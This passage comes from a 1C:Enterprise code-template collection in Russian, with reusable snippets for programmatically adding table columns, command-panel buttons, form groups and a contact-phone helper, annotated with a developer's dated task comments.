	ЭлементыФормы.ДоговорКонтрагента.ТолькоПросмотр = ЗаказПодтвержден;

КонецПроцедуры//++)	
"}
},
{0,
{"Как добавить колонку в табличное поле",0,0,"","Иногда возникает необходимость программно добавить новую колонку в табличное поле документа или элемента справочика. Сделать это можно следующим образом.

Префикс = ""АйТи_"";
лЭлементыФормы<?""Имя таблицы (слитно)"">Колонки = ЭлементыФормы.<?""Имя таблицы (слитно)"">.Колонки;
Если лЭлементыФормы<?""Имя таблицы (слитно)"">Колонки.Найти(Префикс + ""НалоговыйУчет"") = Неопределено Тогда
	КолонкаТабличногоПоля = ЭтаФорма.ЭлементыФормы.<?""Имя таблицы (слитно)"">.Колонки.Добавить(Префикс + ""НалоговыйУчет"", ""НУ""); // Или ЭлементыФормы.<?""Имя таблицы (слитно)"">.Колонки.Добавить(Префикс + ""НалоговыйУчет"", ""НУ"");
	КолонкаТабличногоПоля.УстановитьЭлементУправления(Тип(""ПолеВвода"")); // нужно до присвоения значения реквизиту «Данные». В противном случае добавленный на форму элемент нельзя будет редактировать
	КолонкаТабличногоПоля.Данные 			= ""НалоговыйУчет"";
	КолонкаТабличногоПоля.ПодсказкаВШапке 	= """";
	КолонкаТабличногоПоля.Видимость 		= Истина;
	
	лКолонкаТабличногоПоляЭлементУправления 						= КолонкаТабличногоПоля.ЭлементУправления;
	лКолонкаТабличногоПоляЭлементУправления.МинимальноеЗначение 	= 0;
	лКолонкаТабличногоПоляЭлементУправления.МаксимальноеЗначение 	= 100;
КонецЕсли; 


И здесь есть подводный камень: «УстановитьЭлементУправления» нужно до присвоения значения реквизиту «Данные». В противном случае добавленный на форму элемент нельзя будет редактировать.

Также, в типовой конфигурации 1С:Зарплата и управление персоналом 8.2, имеется специальная функци. При ее использовании код можно сократить до одной строки.

КолонкаТабличногоПоля = РаботаСДиалогами.ВставитьКолонкуВТабличноеПоле(Неопределено, ЭтаФорма.ЭлементыФормы.ОтражениеВУчете, ""НалоговыйУчет"", ""НУ"", ""НалоговыйУчет"", , , , Тип(""ПолеВвода""));"}
},
{0,
{"Добавить колонку пример",0,0,"","Функция ДобавитьКолонкуПроцентаИзноса(пЭтаФорма, пВидимость = Истина) Экспорт
	
	лРезультат = Ложь;
	
	лЭлементыФормыМатериалыКолонки 						= пЭтаФорма.ЭлементыФормы.Материалы.Колонки;
	лЭлементыФормыМатериалыКолонкаАйТи_ПроцентИзноса 	= лЭлементыФормыМатериалыКолонки.Найти(""АйТи_ПроцентИзноса"");
	Если лЭлементыФормыМатериалыКолонкаАйТи_ПроцентИзноса = Неопределено Тогда
		НовыйЭлемент 	= лЭлементыФормыМатериалыКолонки.Добавить(""АйТи_ПроцентИзноса"", ""% износа"");
		НовыйЭлемент.УстановитьЭлементУправления(Тип(""ПолеВвода"")); // нужно до присвоения значения реквизиту «Данные». В противном случае добавленный на форму элемент нельзя будет редактировать
		НовыйЭлемент.Данные 			= ""АйТи_ПроцентИзноса"";
		НовыйЭлемент.ПодсказкаВШапке 	= ""Процент износа"";
		НовыйЭлемент.Видимость 		= пВидимость;
		НовыйЭлемент.Доступность 	= Истина;
		НовыйЭлемент.Ширина 		= 15;
		
		лНовыйЭлементЭлементУправления 						= НовыйЭлемент.ЭлементУправления;
		лНовыйЭлементЭлементУправления.МинимальноеЗначение 	= 0;
		лНовыйЭлементЭлементУправления.МаксимальноеЗначение = 100;
		
		лРезультат = Истина;
	Иначе
		лЭлементыФормыМатериалыКолонкаАйТи_ПроцентИзноса.Видимость = пВидимость;
	КонецЕсли;
	
	Возврат лРезультат;
	
КонецФункции // ДобавитьКолонкуПроцентаИзноса()"}
},
{0,
{"Кнопки доработок в панель ""ОсновныеДействияФормы"" (после них разделитель)",0,0,"","лРазделитель 		= ЭлементыФормы.ОсновныеДействияФормы.Кнопки.Вставить(0, ""АйТи_Разделитель"", ТипКнопкиКоманднойПанели.Разделитель);

НовоеДействие 		= Новый Действие(""Подключаемый_АйТи_ВключитьДоработки"");
лКнопка 			= ЭлементыФормы.ОсновныеДействияФормы.Кнопки.Вставить(0, ""АйТи_ВключитьДоработки"", ТипКнопкиКоманднойПанели.Действие, ""Включить доработки"", НовоеДействие);
лКнопка.Пояснение 	= ""Включить доработки по выгрузке контрагента, иначе будет типовой функционал"";
лКнопка.Подсказка 	= ""Включить доработки по выгрузке контрагента, иначе будет типовой функционал"";
лКнопка.Картинка 	= БиблиотекаКартинок.НастройкаСписка;
лКнопка.Отображение = ОтображениеКнопкиКоманднойПанели.НадписьКартинка;

Если Настройки.Контрагенты.Свойство(""АйТи_ВключитьДоработкиЗаказа"") Тогда
	ЭлементыФормы.ОсновныеДействияФормы.Кнопки.АйТи_ВключитьДоработкиЗаказа.Пометка = Настройки.Контрагенты.АйТи_ВключитьДоработкиЗаказа;
Иначе
	ЭлементыФормы.ОсновныеДействияФормы.Кнопки.АйТи_ВключитьДоработкиЗаказа.Пометка = Истина;
КонецЕсли;

Процедура Подключаемый_АйТи_ВключитьДоработки(Элемент)

	Элемент.Пометка 	= НЕ Элемент.Пометка;
	
	//Если Элемент.Пометка Тогда
	//	Сообщить(""Включен"");
	//Иначе
	//	Сообщить(""Не Включен"");
	//КонецЕсли; 

КонецПроцедуры"}
},
{0,
{"Кнопку в панель (КоманднаяПанельФормы)",0,0,"","//+++
НовоеДействие 	=  Новый Действие(""АйТи_ОбменДаннымиПометка"");
лКнопка 		= ЭлементыФормы.КоманднаяПанельФормы.Кнопки.Добавить(""АйТи_ОбменДанными"", ТипКнопкиКоманднойПанели.Действие, ""Обмен данными (АйТи)"", НовоеДействие);
лКнопка.Подсказка = ""Выполнять в режиме загрузки (Обмен данными = Истина)"";

Процедура АйТи_ОбменДаннымиПометка(Кнопка)
	
	лКнопка 		= ЭлементыФормы.КоманднаяПанельФормы.Кнопки.АйТи_ОбменДанными;
	лКнопка.Пометка = НЕ лКнопка.Пометка;
	
КонецПроцедуры"}
},
{3,
{"ТЧ",1,0,"",""},
{0,
{"Добавить колонку и заполнить категории через реквизит",0,0,"","//+++ ====== Программное создание [ АйТи КучеровРМ ] ================================================

Функция ДобавитьКолонкуТЧ(пЭтаФорма, пИмяТЧ, пВставитьПеред = Неопределено, пИмяЭлемента, пДанные = Неопределено, пЗаголовок = """", пВидимость = Истина, пДоступность = Истина, пШирина = 20) Экспорт
	
	лРезультат 			= Ложь;
	
	пИмяЭлементаАйТи 	= ""АйТи_"" + пИмяЭлемента;
	
	лКолонки 			= пЭтаФорма.ЭлементыФормы[пИмяТЧ].Колонки;
	лТаблицаКолонка 	= лКолонки.Найти(пИмяЭлементаАйТи);
	Если лТаблицаКолонка = Неопределено Тогда
		пВставитьПеред 	= ?(пВставитьПеред = Неопределено, лКолонки.Количество(), пВставитьПеред); //Если индекс равен количеству колонок, то происходит добавление колонки в конец коллекции. 
		НовыйЭлемент 	= лКолонки.Вставить(пВставитьПеред, пИмяЭлементаАйТи);
		НовыйЭлемент.УстановитьЭлементУправления(Тип(""ПолеВвода"")); // нужно до присвоения значения реквизиту «Данные». В противном случае добавленный на форму элемент нельзя будет редактировать
		
		лЗаголовок 						= ?(НЕ ПустаяСтрока(пЗаголовок)	, пЗаголовок, пИмяЭлемента);
		
		НовыйЭлемент.Имя 				= пИмяЭлементаАйТи;
		НовыйЭлемент.ТекстШапки 		= лЗаголовок;
		НовыйЭлемент.Данные 			= ?(пДанные <> Неопределено		, пДанные	, пИмяЭлементаАйТи) ;
		НовыйЭлемент.ПодсказкаВШапке 	= лЗаголовок;
		
		//НовыйЭлемент.Значение 		= ""Тест"";
		
		НовыйЭлемент.ЦветТекстаШапки 	= Новый Цвет(83, 106, 194); //Цвет доработок АйТи
		
		лРезультат 		= Истина;
	Иначе
		НовыйЭлемент 	= лТаблицаКолонка;
	КонецЕсли;
	
	НовыйЭлемент.Видимость 		= пВидимость;
	НовыйЭлемент.Доступность 	= пДоступность;
	НовыйЭлемент.Ширина 		= пШирина;	
	
	Возврат лРезультат;
	
КонецФункции // ДобавитьКолонкуТЧ()

//+++ АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
Функция ДобавитьКолонкуРеквизитаКатегорииНоменклатуры(пЭтаФорма, пВидимость = Истина, пДоступность = Истина, пШирина = 20) Экспорт
	
	лРезультат 	= ДобавитьКолонкуТЧ(пЭтаФорма, ""СуммыДолга"", 4, ""Категория"",,, пВидимость, пДоступность, пШирина);
	
	Возврат лРезультат;
	
КонецФункции // ДобавитьКолонкуРеквизитаКатегорииНоменклатуры() //--- АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3

//--- ====== Программное создание [ АйТи КучеровРМ ] ================================================

//+++ АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
Функция ЗаполнитьКатегорииНоменклатурИзРеализации(пЭтаФорма, пМодифицированность = Ложь) Экспорт

	ЭлементыФормы 	= пЭтаФорма.ЭлементыФормы;
	
	лДокументРасчетовСКонтрагентом 	= ЭлементыФормы.СуммыДолга.Значение.ВыгрузитьКолонку(""ДокументРасчетовСКонтрагентом"");
	 
	Запрос = Новый Запрос;
	Запрос.Текст = 
		""ВЫБРАТЬ
		|	РеализацияТоваровУслуг.Ссылка КАК РеализацияВГруппе,
		|	""""Колбаса"""" КАК ИмяКатегории
		|ИЗ
		|	Документ.РеализацияТоваровУслуг КАК РеализацияТоваровУслуг
		|ГДЕ
		|	РеализацияТоваровУслуг.Товары.Номенклатура В ИЕРАРХИИ(&НоменклатураКатегорияКолбаса)
		|	И РеализацияТоваровУслуг.Ссылка В(&Ссылка)"";
	
	//лКатегорияКолбаса_КиПоком 	= Справочники.Номенклатура.НайтиПоКоду(""00017718"");
	лКатегорияКолбаса_КиПоком 	= Справочники.Номенклатура.НайтиПоКоду(""00000199""); //""Стаканы"" для теста
	   
	
	Запрос.УстановитьПараметр(""НоменклатураКатегорияКолбаса"", лКатегорияКолбаса_КиПоком);
	Запрос.УстановитьПараметр(""Ссылка""						, лДокументРасчетовСКонтрагентом);
	
	лРеализацияВГруппе 		= Запрос.Выполнить().Выгрузить();
	
	лСуммыДолгаЗначение 	= ЭлементыФормы.СуммыДолга.Значение;
	
	Для каждого лСуммыДолгаЗначениеЭлем Из лСуммыДолгаЗначение Цикл
		
		лДокументРасчетовСКонтрагентомЭлем = лСуммыДолгаЗначениеЭлем.ДокументРасчетовСКонтрагентом;
		Если ТипЗнч(лДокументРасчетовСКонтрагентомЭлем) = Тип(""ДокументСсылка.РеализацияТоваровУслуг"") Тогда
			лКатегорияНоменклатуры 					= лРеализацияВГруппе.Найти(лДокументРасчетовСКонтрагентомЭлем, ""РеализацияВГруппе""); 
			лСуммыДолгаЗначениеЭлем.АйТи_Категория 	= ?(лКатегорияНоменклатуры <> Неопределено, лКатегорияНоменклатуры.ИмяКатегории, """");
		Иначе
			лСуммыДолгаЗначениеЭлем.АйТи_Категория 	= ""-""; //Т.е. для других документов нет понятия категории
		КонецЕсли; 
	
	КонецЦикла; 
	
	пЭтаФорма.Модифицированность 	= пМодифицированность;

КонецФункции // ЗаполнитьКатегорииНоменклатурИзРеализации() //--- АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
"}
},
{0,
{"Добавить колонку и вывести категории (без реквизита, только в новую колонку)",0,0,"","На форме при открытии добавить колонку через:
ДобавитьКолонкуКатегорииНоменклатуры(ЭтаФорма,, Ложь);

В методе ТЧ ПриВыводеСтроки прописать присвоение значения для заполнения каждой строки:
ОформлениеСтроки.Ячейки.ИмяКолонки.УстановитьТекст("""");

Ещё на форме в событии ТЧ ""ПриВыводеСтроки"":
// Процедура - обработчик события ""ПриВыводеСтроки"" табличной части
// ""СуммыДолга"". Формирует данные в колонке ""Валюта"" и устанавливает, при необходимости
// автоотметку незаполенного для поля ""Сделка
//
Процедура СуммыДолгаПриВыводеСтроки(Элемент, ОформлениеСтроки, ДанныеСтроки)

	Если ЭлементыФормы.СуммыДолга.Колонки.Валюта.Видимость	Тогда
		ОформлениеСтроки.Ячейки.Валюта.ОтображатьТекст = Истина;
		ОформлениеСтроки.Ячейки.Валюта.Текст = ДанныеСтроки.ДоговорКонтрагента.ВалютаВзаиморасчетов;
	КонецЕсли;

	Если (ДанныеСтроки.ДоговорКонтрагента.ВедениеВзаиморасчетов = Перечисления.ВедениеВзаиморасчетовПоДоговорам.ПоЗаказам 
	  ИЛИ ДанныеСтроки.ДоговорКонтрагента.ВедениеВзаиморасчетов = Перечисления.ВедениеВзаиморасчетовПоДоговорам.ПоСчетам)
	   И НЕ ЗначениеЗаполнено(ДанныеСтроки.Сделка) Тогда
		ОформлениеСтроки.Ячейки.Сделка.ОтметкаНезаполненного = Истина;
	Иначе
		ОформлениеСтроки.Ячейки.Сделка.ОтметкаНезаполненного = Ложь;
	КонецЕсли;
	                                     
	//+++ АйТи Кучеров Р.М. 10.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
	ПоказатьКатегориюРеализации(ЭлементыФормы.СуммыДолга.Колонки, ОформлениеСтроки.Ячейки, ДанныеСтроки.ДокументРасчетовСКонтрагентом);
	//--- АйТи Кучеров Р.М. 10.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
	
КонецПроцедуры

//+++ ====== Программное создание [ АйТи КучеровРМ ] ================================================

Функция ДобавитьКолонкуТЧ(пЭтаФорма, пИмяТЧ, пВставитьПеред = Неопределено, пИмяЭлемента, пДанные = Неопределено, пЗаголовок = """", пВидимость = Истина, пДоступность = Истина, пШирина = 20) Экспорт
	
	лРезультат 			= Ложь;
	
	пИмяЭлементаАйТи 	= ""АйТи_"" + пИмяЭлемента;
	
	лКолонки 			= пЭтаФорма.ЭлементыФормы[пИмяТЧ].Колонки;
	лТаблицаКолонка 	= лКолонки.Найти(пИмяЭлементаАйТи);
	Если лТаблицаКолонка = Неопределено Тогда
		пВставитьПеред 	= ?(пВставитьПеред = Неопределено, лКолонки.Количество(), пВставитьПеред); //Если индекс равен количеству колонок, то происходит добавление колонки в конец коллекции. 
		НовыйЭлемент 	= лКолонки.Вставить(пВставитьПеред, пИмяЭлементаАйТи);
		НовыйЭлемент.УстановитьЭлементУправления(Тип(""ПолеВвода"")); // нужно до присвоения значения реквизиту «Данные». В противном случае добавленный на форму элемент нельзя будет редактировать
		
		лЗаголовок 						= ?(НЕ ПустаяСтрока(пЗаголовок)	, пЗаголовок, пИмяЭлемента);
		
		НовыйЭлемент.Имя 				= пИмяЭлементаАйТи;
		НовыйЭлемент.ТекстШапки 		= лЗаголовок;
		НовыйЭлемент.Данные 			= ?(пДанные <> Неопределено		, пДанные	, пИмяЭлементаАйТи) ;
		НовыйЭлемент.ПодсказкаВШапке 	= лЗаголовок;
		
		//НовыйЭлемент.Значение 		= ""Тест"";
		
		НовыйЭлемент.ЦветТекстаШапки 	= Новый Цвет(83, 106, 194); //Цвет доработок АйТи
		
		лРезультат 		= Истина;
	Иначе
		НовыйЭлемент 	= лТаблицаКолонка;
	КонецЕсли;
	
	НовыйЭлемент.Видимость 		= пВидимость;
	НовыйЭлемент.Доступность 	= пДоступность;
	НовыйЭлемент.Ширина 		= пШирина;	
	
	Возврат лРезультат;
	
КонецФункции // ДобавитьКолонкуТЧ()

//+++ АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
Функция ДобавитьКолонкуКатегорииНоменклатуры(пЭтаФорма, пВидимость = Истина, пДоступность = Истина, пШирина = 20) Экспорт
	
	лРезультат 	= ДобавитьКолонкуТЧ(пЭтаФорма, ""СуммыДолга"", 4, ""Категория"", """",, пВидимость, пДоступность, пШирина);
	
	Возврат лРезультат;
	
КонецФункции // ДобавитьКолонкуРеквизитаКатегорииНоменклатуры() //--- АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3

//--- ====== Программное создание [ АйТи КучеровРМ ] ================================================

//+++ АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3
Функция ПоказатьКатегорииНоменклатурИзРеализации(пДокумент) Экспорт

	Запрос = Новый Запрос;
	Запрос.Текст = 
		""ВЫБРАТЬ
		|	РеализацияТоваровУслуг.Ссылка КАК РеализацияВГруппе,
		|	""""Колбаса"""" КАК ИмяКатегории
		|ИЗ
		|	Документ.РеализацияТоваровУслуг КАК РеализацияТоваровУслуг
		|ГДЕ
		|	РеализацияТоваровУслуг.Товары.Номенклатура В ИЕРАРХИИ(&НоменклатураКатегорияКолбаса)
		|	И РеализацияТоваровУслуг.Ссылка = &Ссылка"";
	
	//лКатегорияКолбаса_КиПоком 	= Справочники.Номенклатура.НайтиПоКоду(""00017718"");
	лКатегорияКолбаса_КиПоком 	= Справочники.Номенклатура.НайтиПоКоду(""00000199""); //""Стаканы"" для теста
	   
	Запрос.УстановитьПараметр(""НоменклатураКатегорияКолбаса"", лКатегорияКолбаса_КиПоком);
	Запрос.УстановитьПараметр(""Ссылка""						, пДокумент);
	
	лРеализацияВГруппе 		= Запрос.Выполнить().Выгрузить();
	
	Если ТипЗнч(пДокумент) = Тип(""ДокументСсылка.РеализацияТоваровУслуг"") Тогда
		лКатегорияНоменклатуры 					= лРеализацияВГруппе.Найти(пДокумент, ""РеализацияВГруппе""); 
		лКатегория 	= ?(лКатегорияНоменклатуры <> Неопределено, лКатегорияНоменклатуры.ИмяКатегории, """");
	Иначе
		лКатегория 	= ""-""; //Т.е. для других документов нет понятия категории
	КонецЕсли; 
		
	Возврат лКатегория;
	
КонецФункции // ЗаполнитьКатегорииНоменклатурИзРеализации() //--- АйТи Кучеров Р.М. 04.09.2019 ТЗ № 0К00-003527 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=baac32336337376211e9cd8d175164b3


// Процедура добавляет информацию о категории в ячейки табличного поля
// при выводе очередной строки
//
// Параметры:
//  КолонкиТабПоля - коллекция колонок табличного поля
//  ЯчейкиСтрокиТабПоля - коллекция ячеек строки табличного поля
//  ДокументРасчетовСКонтрагентом - СправочникСсылка.Документы, документ, по которому надо вывести категорию (т.е. параметр на основе которого заполняются данные)
//
Процедура ПоказатьКатегориюРеализации(КолонкиТабПоля, ЯчейкиСтрокиТабПоля, ДокументРасчетовСКонтрагентом) Экспорт

	Если КолонкиТабПоля.АйТи_Категория.Видимость Тогда
		Если ДокументРасчетовСКонтрагентом <> Неопределено Тогда
			ЯчейкиСтрокиТабПоля.АйТи_Категория.УстановитьТекст(ПоказатьКатегорииНоменклатурИзРеализации(ДокументРасчетовСКонтрагентом));
		Иначе
			ЯчейкиСтрокиТабПоля.АйТи_Категория.УстановитьТекст("""");
		КонецЕсли;
	КонецЕсли;

КонецПроцедуры // ПоказатьКатегориюРеализации()"}
},
{0,
{"Добавить панель и кнопку с действием (с пометкой)",0,0,"","Процедура ПриОткрытии()
	
	//+++ АйТи Кучеров Р.М. 22.11.2019 ТЗ № ИС00-004899 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9fa49245320c0
	лКоманднаяПанель 			= ЭлементыФормы.Добавить(Тип(""КоманднаяПанель""), ""АйТи_КоманднаяПанель"");
	лКоманднаяПанель.Лево 		= 0;
	лКоманднаяПанель.Ширина 	= 565;
	лКоманднаяПанель.Верх 		= 0;
	лКоманднаяПанель.Высота 	= 24;
	лКоманднаяПанель.УстановитьПривязку(ГраницаЭлементаУправления.Право	, ЭлементыФормы.ОсновныеДействияФормы, ГраницаЭлементаУправления.Право);
	
	НовоеДействие 		= Новый Действие(""Подключаемый_АйТи_ВключитьДоработки"");
	лКнопка 			= лКоманднаяПанель.Кнопки.Добавить(""АйТи_ВключитьДоработки"", ТипКнопкиКоманднойПанели.Действие, ""Включить доработки"", НовоеДействие);
	лКнопка.Пояснение 	= ""Включить доработки, иначе будет типовой функционал"";
	лКнопка.Подсказка 	= ""Включить доработки, иначе будет типовой функционал"";
	лКнопка.Картинка 	= БиблиотекаКартинок.НастройкаСписка;
	лКнопка.Отображение = ОтображениеКнопкиКоманднойПанели.НадписьКартинка;
	
	Если Настройки.Контрагенты.Свойство(""АйТи_ВключитьДоработки"") Тогда
		ЭлементыФормы.АйТи_КоманднаяПанель.Кнопки.АйТи_ВключитьДоработки.Пометка = Настройки.Контрагенты.АйТи_ВключитьДоработки;
	КонецЕсли;
	
	//--- АйТи Кучеров Р.М. 22.11.2019 ТЗ № ИС00-004899 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9fa49245320c0
		
КонецПроцедуры

//+++ АйТи Кучеров Р.М. 22.11.2019 ТЗ № ИС00-004899 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=a4e232336337376211e9fa49245320c0
Процедура Подключаемый_АйТи_ВключитьДоработки(Элемент)

	лКнопка 			= Элемент;
	лКнопка.Пометка 	= НЕ лКнопка.Пометка;
	
	//Если лКнопка.Пометка Тогда
	//	Сообщить(""Включен"");
	//Иначе
	//	Сообщить(""Не Включен"");
	//КонецЕсли; 

КонецПроцедуры"}
}
}
},
{4,
{"Фирменные",1,0,"",""},
{0,
{"Цвет доработок",0,0,"ЦветАйТи","Новый Цвет(83, 106, 194)"}
},
{0,
{"Подпись и цвет доработок",0,0,"АйТиДораб[отк]","лПрефиксДоработокАйТи 	= ""АйТи_"";
лПодписьДоработокАйТи 	= "" (АйТи)"";
лЦветДоработокАйТи 		= Новый Цвет(83, 106, 194); //Цвет доработок АйТи"}
},
{0,
{"Кнопка",0,0,"","лИмяКнопки 	= ""АйТи_Кнопка"";
ДобавитьКнопкуНаФорму(Элементы, пФорма.Команды, лИмяКнопки, ""Настройки отбора по умолчанию"" + лПодписьДоработокАйТи, лИмяКнопки, Элементы.НастройкаВыгрузкиДокументов);
Элементы[лИмяКнопки].ЦветТекста 	= лЦветДоработокАйТи;"}
},
{0,
{"Вывести телефон/комментарий контактного лица",0,0,"","АйТи_ОбщиеФункцииСервер.ВывестиТелефонКомментарийКЛ(ЭтаФорма, <?""Реквизит контактного лица"">, <?""Реквизит телефона"">, ""<?""Имя реквизита телефона (с одноимённым элементом)"">"", Элементы.пКИВладелец, Элементы.пКИВставитьПеред,, Элементы.пКЛКомментарийПрикрепить, Истина); //ПриСозданииНаСервере

//+++ АйТи <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ## Телефон и комментарий контактного лица

&НаКлиенте
Процедура Подключаемый_<?""Реквизит контактного лица"">ПриИзменении(Элемент)
	
	лИнфоКЛ 	= АйТи_ОбщиеФункцииСервер.ПолучитьИнфоКЛ(<?""Реквизит контактного лица"">);
	Айти_ОбщиеФункцииКлиент.УстановитьЭлементКомментарийПоля(лИнфоКЛ.Комментарий, ЭтаФорма[""АбонентКомментарий""], Элементы[""Элемент_АбонентКомментарий""]);
	
КонецПроцедуры // Подключаемый_АбонентПриИзменении()

&НаКлиенте
Процедура Подключаемый_<?""Имя реквизита телефона (с одноимённым элементом)"">ПриИзменении(Элемент)
	
	Айти_ОбщиеФункцииКлиент.ТелефонКонтактногоЛицаПриИзменении(ЭтаФорма, <?""Реквизит контактного лица"">, <?""Реквизит телефона"">, <?""Реквизит телефона"">, <?""Имя реквизита телефона (с одноимённым элементом)"">);
	
КонецПроцедуры

&НаКлиенте
Процедура Подключаемый_АйТи_Позвонить(Команда)
	
	ФормаМИКО 	= ПолучитьФорму(""Обработка.МИКО_ПанельТелефонииДля1С.Форма.Форма"");
	                                                        
	врДанные 	= Новый Структура;
	врДанные.Вставить(""ОснованиеЗвонка""	, Объект.Ссылка);
	врДанные.Вставить(""Ответ""			, Объект.Описание);
	
	Оповестить(""Позвонить"", <?""Реквизит телефона"">, врДанные);
	
КонецПроцедуры

&НаКлиенте
Процедура Подключаемый_МестоОткрытие(Элемент, СтандартнаяОбработка)
	
	СтандартнаяОбработка 	= Ложь;
	
	лИмяТелефонКонтактногоЛица_КомментарийКонтакт 	= ""<?""Имя реквизита телефона (с одноимённым элементом)"">_КомментарийКонтакт"";
	лИмяТелефонКонтактногоЛица_ЗначенияПолей 		= ""<?""Имя реквизита телефона (с одноимённым элементом)"">_ЗначенияПолей"";
	
	лРезультат 		= АйТи_ОбщиеФункцииКлиент.ПодготовкаОткрытьФормуКонтактнойИнформации(Элемент, ЭтаФорма[лИмяТелефонКонтактногоЛица_КомментарийКонтакт], ЭтаФорма[лИмяТелефонКонтактногоЛица_ЗначенияПолей],, <?""Реквизит контактного лица"">, Истина);
	
	Если лРезультат <> Неопределено Тогда
		ОписаниеОповещения 	= Новый ОписаниеОповещения(""ЗначениеКИКонтактаРедактированиеВДиалогеЗавершено"", ЭтотОбъект, лРезультат.ДополнительныеПараметры);
		УправлениеКонтактнойИнформациейКлиент.ОткрытьФормуКонтактнойИнформации(лРезультат.ПараметрыФормы,, ОписаниеОповещения);
	КонецЕсли; 
	
КонецПроцедуры

&НаКлиенте
Процедура ЗначениеКИКонтактаРедактированиеВДиалогеЗавершено(РезультатЗакрытия, ДополнительныеПараметры) Экспорт
	
	Если ТипЗнч(РезультатЗакрытия) <> Тип(""Структура"") Тогда
		Возврат;
	КонецЕсли;
	
	<?""Реквизит телефона"">						= РезультатЗакрытия.Представление;
	ЭтаФорма.<?""Имя реквизита телефона (с одноимённым элементом)"">_ЗначенияПолей		= РезультатЗакрытия.КонтактнаяИнформация;
	ЭтаФорма.<?""Имя реквизита телефона (с одноимённым элементом)"">_КомментарийКонтакт	= РезультатЗакрытия.Комментарий;
	
КонецПроцедуры

//--- АйТи <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ## Телефон и комментарий контактного лица"}
}
},
{14,
{"Элементы УФ",1,0,"",""},
{0,
{"ДобавитьЭлемент (УФ)",0,0,"","&НаСервере
Процедура ДобавитьЭлементНаСервере(ИмяКолонки, ПутьКДанным, ЭлементРодитель, пВставитьПеред = Неопределено, Заголовок = """", Видимость = Истина)
	
	Если Элементы.Найти(ИмяКолонки) = Неопределено Тогда
		Если ПустаяСтрока(Заголовок) Тогда
			Заголовок 	= ИмяКолонки;
		КонецЕсли;
		
		лТипЭлемента 	= Тип(""ПолеФормы"");
		
		Если пВставитьПеред = Неопределено Тогда
			лЭлементФормы 	= Элементы.Добавить(ИмяКолонки, лТипЭлемента, ЭлементРодитель);
		Иначе
			лЭлементФормы 	= Элементы.Вставить(ИмяКолонки, лТипЭлемента, ЭлементРодитель, пВставитьПеред);
		КонецЕсли;
		
		лЭлементФормы.Вид 			= ВидПоляФормы.ПолеВвода;
		лЭлементФормы.ПутьКДанным 	= ПутьКДанным;
		лЭлементФормы.Подсказка 	= Заголовок;
		лЭлементФормы.Видимость 	= Видимость;
	КонецЕсли; 
	
КонецПроцедуры"}
},
{0,
{"Добавить-Вставить",0,0,"ДобВст[ави]","лТипЭлемента 	= Тип(""ПолеФормы"");
Если пВставитьПеред = Неопределено Тогда
	лЭлементФормы 	= Элементы.Добавить(ИмяКолонки, лТипЭлемента, ЭлементРодитель);
Иначе
	лЭлементФормы 	= Элементы.Вставить(ИмяКолонки, лТипЭлемента, ЭлементРодитель, пВставитьПеред);
КонецЕсли;"}
},
{0,
{"Процедура добавления элементов (ДобавитьЭлементыНаФорму)",0,0,"","&НаСервере
Процедура ДобавитьЭлементыНаФормуДокумента<?""Имя документа (слитно)"">(пФорма) Экспорт
	
	лПрефиксИмя 		= ""АйТи_""; // Через ""пФорма.Элементы."" обращаться с учётом префикса или через возвращенный элемент при добавлении
	
КонецПроцедуры"}
},
{0,
{"Закладки и страница",0,0,"ФЭДС[траниц]","лСтраницы			=	Форма.Элементы.Добавить(лПрефиксИмя + ""Страницы"", Тип(""ГруппаФормы""), пФорма);
лСтраницы.Вид		=	ВидГруппыФормы.Страницы;
лСтраницы.Заголовок	=	""Страницы"";

СтраницаОсновное			=	Форма.Элементы.Добавить(лПрефиксИмя + ""СтраницаОсновное"", Тип(""ГруппаФормы""), лСтраницы);
СтраницаОсновное.Вид		=	ВидГруппыФормы.Страница;
СтраницаОсновное.Заголовок	=	""Основное"";"}
},
{0,
{"Группы добавить",0,0,"ФЭДГ[рупп]","лГруппа<?""Название группы (слитно)"">			=	пФорма.Элементы.Добавить(лПрефиксИмя + ""Группа<?""Название группы (слитно)"">"", Тип(""ГруппаФормы""), пФорма);
лГруппа<?""Название группы (слитно)"">.Вид		=	ВидГруппыФормы.ОбычнаяГруппа;
лГруппа<?""Название группы (слитно)"">.Заголовок	=	""<?""Название группы (слитно)"">"";
лГруппа<?""Название группы (слитно)"">.ОтображатьЗаголовок = Ложь;"}
},
{0,
{"Группы вставить",0,0,"ФЭВГ[рупп]","лГруппа<?""Название группы (слитно)"">			=	пФорма.Элементы.Вставить(лПрефиксИмя + ""Группа<?""Название группы (слитно)"">"", Тип(""ГруппаФормы""), пФорма, ПередКемВставить);
лГруппа<?""Название группы (слитно)"">.Вид		=	ВидГруппыФормы.ОбычнаяГруппа;
лГруппа<?""Название группы (слитно)"">.Заголовок	=	""<?""Название группы (слитно)"">"";
лГруппа<?""Название группы (слитно)"">.ОтображатьЗаголовок = Ложь;"}
},
{0,
